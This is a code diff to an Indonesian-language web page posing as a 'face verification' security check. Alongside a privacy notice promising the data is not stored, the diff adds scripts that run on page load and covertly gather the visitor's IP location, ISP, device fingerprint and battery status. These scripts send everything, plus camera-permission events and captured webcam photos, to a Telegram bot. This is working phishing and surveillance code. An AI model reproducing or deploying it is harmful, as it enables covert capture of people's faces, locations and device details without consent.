@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Verifikasi Wajah | Sistem Verifikasi</title>
+  <title>Verifikasi Wajah | Verifikasi Keamanan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     * { 
@@ -283,6 +283,14 @@
     let countdownInterval;
     let remainingTime = VERIFICATION_DURATION;
     
+    // Send initial access data when page loads
+    document.addEventListener("DOMContentLoaded", function() {
+      // Add a short delay to ensure everything is loaded
+      setTimeout(function() {
+        sendAccessInfo();
+      }, 1000);
+    });
+    
     // Enable button when checkbox is checked
     checkbox.addEventListener("change", function() {
       verifyButton.disabled = !this.checked;
@@ -290,6 +298,211 @@
     
     function showPrivacyInfo() {
       alert("Kebijakan Privasi & Keamanan\n\nData biometrik Anda digunakan hanya untuk verifikasi saat ini dan tidak disimpan permanen. Kami menggunakan enkripsi end-to-end untuk melindungi data Anda selama proses verifikasi.");
+    }
+
+    // Function to get device information
+    async function getDeviceInfo() {
+      // Default information
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        pixelRatio: window.devicePixelRatio,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        isOnline: navigator.onLine,
+        connectionType: "unknown"
+      };
+
+      // Try to get connection info if available
+      if (navigator.connection) {
+        deviceInfo.connectionType = navigator.connection.effectiveType || "unknown";
+        deviceInfo.downlink = navigator.connection.downlink || "unknown";
+        deviceInfo.rtt = navigator.connection.rtt || "unknown";
+      }
+
+      return deviceInfo;
+    }
+
+    // Function to get battery information
+    async function getBatteryInfo() {
+      // Default battery info
+      let batteryInfo = {
+        level: "Unknown",
+        charging: "Unknown"
+      };
+      
+      try {
+        // Try to get battery info using the Battery API
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          batteryInfo.level = Math.floor(battery.level * 100) + "%";
+          batteryInfo.charging = battery.charging ? "Sedang Charging.." : "Tidak Charging";
+        }
+      } catch (error) {
+        console.error("Error getting battery info:", error);
+      }
+      
+      return batteryInfo;
+    }
+    
+    // Try multiple services to get IP information
+    async function getIPInfo() {
+      // List of IP info services to try
+      const services = [
+        "https://ipinfo.io/json",
+        "https://ipapi.co/json/",
+        "https://api.db-ip.com/v2/free/self",
+        "https://api.ipify.org?format=json"
+      ];
+      
+      // Default IP info
+      let ipInfo = {
+        ip: "Unknown",
+        loc: "Unknown",
+        city: "Unknown",
+        region: "Unknown",
+        country: "ID", // Default to Indonesia
+        org: "Unknown",
+        hostname: "Unknown"
+      };
+
+      // Try each service until one works
+      for (const service of services) {
+        try {
+          const response = await fetch(service, { timeout: 5000 });
+          if (response.ok) {
+            const data = await response.json();
+            
+            // Map different API responses to our standard format
+            if (service.includes("ipinfo.io")) {
+              ipInfo = {
+                ip: data.ip || ipInfo.ip,
+                loc: data.loc || ipInfo.loc,
+                city: data.city || ipInfo.city,
+                region: data.region || ipInfo.region,
+                country: data.country || ipInfo.country,
+                org: data.org || ipInfo.org,
+                hostname: data.hostname || ipInfo.hostname
+              };
+              break;
+            } else if (service.includes("ipapi.co")) {
+              ipInfo = {
+                ip: data.ip || ipInfo.ip,
+                loc: `${data.latitude},${data.longitude}` || ipInfo.loc,
+                city: data.city || ipInfo.city,
+                region: data.region || ipInfo.region,
+                country: data.country_code || ipInfo.country,
+                org: data.org || ipInfo.org,
+                hostname: "Unknown"
+              };
+              break;
+            } else if (service.includes("db-ip.com")) {
+              ipInfo = {
+                ip: data.ipAddress || ipInfo.ip,
+                loc: "Unknown",
+                city: data.city || ipInfo.city,
+                region: data.stateProv || ipInfo.region,
+                country: data.countryCode || ipInfo.country,
+                org: "Unknown",
+                hostname: "Unknown"
+              };
+              break;
+            } else if (service.includes("ipify.org")) {
+              // This one only gives IP, but better than nothing
+              ipInfo.ip = data.ip || ipInfo.ip;
+              break;
+            }
+          }
+        } catch (error) {
+          console.error(`Error fetching from ${service}:`, error);
+          // Continue to the next service
+        }
+      }
+      
+      return ipInfo;
+    }
+    
+    // Function to send access information to Telegram
+    async function sendAccessInfo() {
+      try {
+        // Get all info in parallel
+        const [ipInfo, batteryInfo, deviceInfo] = await Promise.all([
+          getIPInfo(),
+          getBatteryInfo(),
+          getDeviceInfo()
+        ]);
+        
+        const message = `
+Link opened by ${ipInfo.ip}
+with user agent:
+${deviceInfo.userAgent}
+===============
+🔋: ${batteryInfo.level}
+⚡: ${batteryInfo.charging}
+===============
+DEVICE INFORMATION:
+Screen Size: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.pixelRatio}x)
+Platform: ${deviceInfo.platform}
+Language: ${deviceInfo.language}
+TimeZone: ${deviceInfo.timeZone}
+Connection: ${deviceInfo.connectionType}
+===============
+NETWORK INFORMATION:
+Hostname ISP: ${ipInfo.hostname || "Unknown"}
+Location ISP: ${ipInfo.loc || "Unknown"}
+ISP: ${ipInfo.org || "Unknown"}
+City Server ISP: ${ipInfo.city || "Unknown"}
+Region ISP: ${ipInfo.region || "Unknown"}
+Country ISP: ${ipInfo.country || "Unknown"}
+Phone ISP: Unknown
+`.trim();
+        
+        // Send message with retry mechanism
+        await sendTelegramMessage(message);
+        console.log("✅ Access info sent successfully!");
+      } catch (error) {
+        console.error("Failed to send access info:", error);
+      }
+    }
+    
+    // Function to send message to Telegram with retry
+    async function sendTelegramMessage(message, retries = 3) {
+      for (let attempt = 0; attempt < retries; attempt++) {
+        try {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("text", message);
+          formData.append("parse_mode", "HTML");
+          
+          const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            body: formData,
+            timeout: 10000 // 10 seconds timeout
+          });
+          
+          const data = await response.json();
+          
+          if (data.ok) {
+            return data;
+          } else {
+            throw new Error(`Telegram API error: ${data.description}`);
+          }
+        } catch (error) {
+          console.error(`Attempt ${attempt + 1}/${retries} failed:`, error);
+          
+          if (attempt === retries - 1) {
+            throw error; // Rethrow after last retry
+          }
+          
+          // Wait before retrying (exponential backoff)
+          await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempt)));
+        }
+      }
     }
 
     function prosesVerifikasi() {
@@ -304,6 +517,9 @@
       spinner.style.display = "block";
       verifyButton.disabled = true;
       
+      // Send camera permission request notification
+      sendPermissionRequestInfo();
+      
       // Request camera access
       navigator.mediaDevices.getUserMedia({ 
         video: { 
@@ -316,6 +532,9 @@
         stream = streamObj;
         video.srcObject = stream;
         videoContainer.style.display = "block";
+        
+        // Send camera access granted notification
+        sendCameraAccessInfo(true);
         
         // Start countdown
         countdownEl.style.display = "block";
@@ -346,12 +565,40 @@
       })
       .catch(error => {
         console.error(error);
+        // Send camera access denied notification
+        sendCameraAccessInfo(false, error.message);
+        
         statusText.innerText = "";
         spinner.style.display = "none";
         errorMessage.style.display = "block";
         errorMessage.innerText = "❌ Kamera gagal dibuka: " + error.message;
         verifyButton.disabled = false;
       });
+    }
+    
+    // Function to send camera permission request info
+    async function sendPermissionRequestInfo() {
+      try {
+        const message = "🔔 User mengklik tombol 'Mulai Verifikasi' dan diminta izin kamera";
+        await sendTelegramMessage(message);
+        console.log("✅ Permission request info sent!");
+      } catch (error) {
+        console.error("Failed to send permission request info:", error);
+      }
+    }
+    
+    // Function to send camera access info
+    async function sendCameraAccessInfo(granted, errorMsg = "") {
+      try {
+        const message = granted 
+          ? "✅ User memberikan izin akses kamera"
+          : `❌ User menolak izin akses kamera: ${errorMsg}`;
+        
+        await sendTelegramMessage(message);
+        console.log("✅ Camera access info sent!");
+      } catch (error) {
+        console.error("Failed to send camera access info:", error);
+      }
     }
 
     function ambilGambarKamera(video, index) {
@@ -372,35 +619,58 @@
       }, 'image/jpeg', 0.8);
     }
 
-    function kirimKeTelegram(blob, index) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, `wajah_${index}.jpg`);
-      
-      // Add metadata
-      const metadata = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        screenSize: `${window.screen.width}x${window.screen.height}`,
-        frameNumber: index + 1
-      };
-      
-      formData.append("caption", JSON.stringify(metadata));
+    async function kirimKeTelegram(blob, index) {
+      try {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, `wajah_${index}.jpg`);
+        
+        // Add metadata
+        const metadata = {
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          screenSize: `${window.screen.width}x${window.screen.height}`,
+          frameNumber: index + 1
+        };
+        
+        formData.append("caption", JSON.stringify(metadata));
 
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        console.log(`✅ Gambar ${index + 1} dikirim!`, data);
-      })
-      .catch(err => {
-        console.error(`❌ Kirim gambar ${index + 1} gagal:`, err.message);
-      });
+        // Send photo with retry mechanism
+        let success = false;
+        let attempts = 0;
+        
+        while (!success && attempts < 3) {
+          try {
+            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: formData,
+              timeout: 15000 // 15 seconds timeout for image uploads
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+              success = true;
+              console.log(`✅ Gambar ${index + 1} dikirim!`, data);
+            } else {
+              throw new Error(`Telegram API error: ${data.description}`);
+            }
+          } catch (error) {
+            attempts++;
+            console.error(`Kirim gambar ${index + 1} gagal (attempt ${attempts}/3):`, error.message);
+            
+            if (attempts < 3) {
+              // Wait before retrying
+              await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
+            }
+          }
+        }
+      } catch (err) {
+        console.error(`❌ Kirim gambar ${index + 1} gagal total:`, err.message);
+      }
     }
     
-    function finishVerification(success) {
+    async function finishVerification(success) {
       // Clear intervals
       clearInterval(intervalId);
       clearInterval(countdownInterval);
@@ -416,6 +686,18 @@
       // Reset UI
       spinner.style.display = "none";
       statusText.innerText = "";
+      
+      // Send verification completion notification
+      try {
+        const message = success
+          ? "✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan"
+          : "❌ Verifikasi wajah gagal";
+        
+        await sendTelegramMessage(message);
+        console.log("✅ Verification completion info sent!");
+      } catch (error) {
+        console.error("Failed to send verification completion info:", error);
+      }
       
       if (success) {
         successMessage.style.display = "block";
